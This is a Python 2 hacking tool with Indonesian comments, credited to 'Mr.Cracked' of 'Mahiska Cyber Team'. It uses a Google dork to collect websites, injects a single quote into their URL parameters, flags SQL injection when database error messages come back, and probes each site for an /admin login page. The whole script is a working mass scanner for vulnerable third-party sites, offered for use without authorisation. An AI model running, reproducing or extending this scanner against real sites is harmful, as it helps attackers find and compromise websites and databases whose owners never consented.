# Author : Mr.Cracked
# Team : Mahiska Cyber Team
# Mau Recode ? Boleh, Asalkan Author Jangan Di Ganti ^_^
# Hargain Karya Orang Lain
# Maaf Kodenya Simple + Acak"an, Masih Newbie Soalnya :(

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

import random, platform, sys, os, re

if platform.system() != 'Linux':
	print 'Hanya Dapat Dijalankan Diplatform Linux !'
	sys.exit()
	
else:
	pass
	
try:
	from time import sleep
	from urllib import unquote
	from bs4 import BeautifulSoup
	from requests.exceptions import ConnectionError
	import requests

	os.system('clear')
	 
	list_agent = ['Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.8; ARM; Trident/7.1; Touch; rv:11.1; IEMobile/11.1; NOKIA; 909) like iPhone OS 7_0_4 Mac OS X AppleWebKit/536 (KHTML, like Gecko) Mobile Safari/536', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Nokia 525) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537']
	random_agent = random.choice(list_agent)
	
	def Banner():
		print(''+C+'''
   _____                 ____        _   
  / ____|               |  _ \      | |  
 | (___   ___ __ _ _ __ | |_) | ___ | |_ 
  \___ \ / __/ _` | '_ \|  _ < / _ \| __|
  ____) | (_| (_| | | | | |_) | (_) | |_ 
 |_____/ \___\__,_|_| |_|____/ \___/ \__|
 
	'''+W+'Scan : SQL Injection & Admin Login With Accuracy 90%\n\tCreator : Mr.Cracked')

	Banner()
	print
	dork = raw_input(C+'DORK SQLI'+U+' ('+H+' Ex : '+W+'inurl:/page php?id= '+U+')'+W+' : '+C+'')
	site = raw_input(C+'JUMLAH SITE DI SCAN'+U+' ('+H+' Default : '+W+'500'+U+' )'+W+' : '+C+'')
	print
	print(C+'   -------------- '+W+'Starting'+C+' --------------')
	
	user_agent = {'User-Agent' : random_agent}
	get_url = requests.get('https://www.google.co.in/search?num={}&q={}'.format(site, dork), headers = user_agent, timeout = 10)
	
	a = 1
	
	for url in re.findall(r'\<a\ href\=\"(.*?)\"\>', get_url.text):
		try:
			
			if not 'http' in url or not '%3D' in url or 'google' in url or 'youtube' in url or 'github' in url or 'download' in url or 'Download' in url or 'downloads' in url or 'Downloads' in url or 'wp-content' in url or '.pdf' in url or '.exe' in url:
				None
			
			else:
				print
				print(W+'==================='+C+' Url Ke '+str(a)+W+' ===================')
				print
				url_1 = url.strip('/url?q=').split('&amp')[0]
				url_2 = unquote(url_1).decode('utf-8')
				print(W+'URL : '+C+url_2)
				normal = url_2
				sql = url_2 + '%27'
				get_normal = requests.get(normal, headers = user_agent, timeout = 10, allow_redirects = True)
				get_sql = requests.get(sql, headers = user_agent, allow_redirects = True, timeout = 10)
					
				if 'xampp' in get_sql.text:
					print(P+'VULN SQLI INTO : '+H+'FOUND')
					
				elif 'You have an error in your SQL syntax' in get_sql.text or 'supplied argument is not a valid MySQL result resource,check the manual that corresponds to your MySQL' in get_sql.text or 'mysql_fetch_array()' in get_sql.text or 'function fetch_row()' in get_sql.text or 'Microsoft OLE DB Provider for ODBC Drivers error' in get_sql.text or 'on line' in get_sql.text or 'at line' in get_sql.text or 'SQL syntax' in get_sql.text or 'Could not connect' in get_sql.text or 'xampp/' in get_sql.text or 'home/' in get_sql.text or 'CDbCommand failed to execute the SQL statement' in get_sql.text:
					print(W+'VULN SQLI : '+H+'FOUND')
					
				elif len(get_normal.text) == len(get_sql.text) or get_sql.status_code >= 400 or len(get_normal.text) < len(get_sql.text) == True or get_sql.status_code == 301:
					print(W+'VULN SQLI : '+A+'NOT FOUND')
					
				elif len(get_normal.text) > len(get_sql.text):
					print(W+'VULN SQLI : '+H+'FOUND')
					
				else:
					print(W+'VULN SQLI : '+A+'NOT FOUND')
					
				site_2 = url.strip('/url?q=').split('&amp')[0].split('/')[2]
				cek_admin = requests.get('http://' + str(site_2) + '/admin', headers = user_agent, timeout = 10, allow_redirects = True)
				
				a += 1
				
				if cek_admin.status_code == 200:
					print(W+'ADMIN LOGIN : '+H+'FOUND '+str(cek_admin.status_code)+W+' ('+H+' /admin'+W+' )')
			
				else:
					print(W+'ADMIN LOGIN : '+A+'NOT FOUND '+str(cek_admin.status_code)+W+' ('+A+' /admin'+W+' )')
		
		except:
			print(M+'SITE TIDAK ADA / JARINGAN TERGANGGU !');
			print
			continue
			
except ImportError:
	os.system('clear')
	print(C+'MODULE BELUM TERINSTALL'+W+' ...')
	sleep(1)
	print
	install_module = raw_input(W+'Install ?'+C+' ['+W+'Y'+C+'/'+W+'n'+C+'] ')
	
	if install_module.upper() == 'Y':
		print
		print(C+'Install Module'+W+' ...')
		sleep(1.5)
		print
		os.system('pip2 install -r requirements.txt')
		print
		print(C+'Install Selesai'+W+' ^_^')
		sleep(1.5)
		os.system('clear')
		os.system('python2 '+__file__)
		
	else:
		print
		print(C+'Thanks'+W+' *_*')
		sys.exit()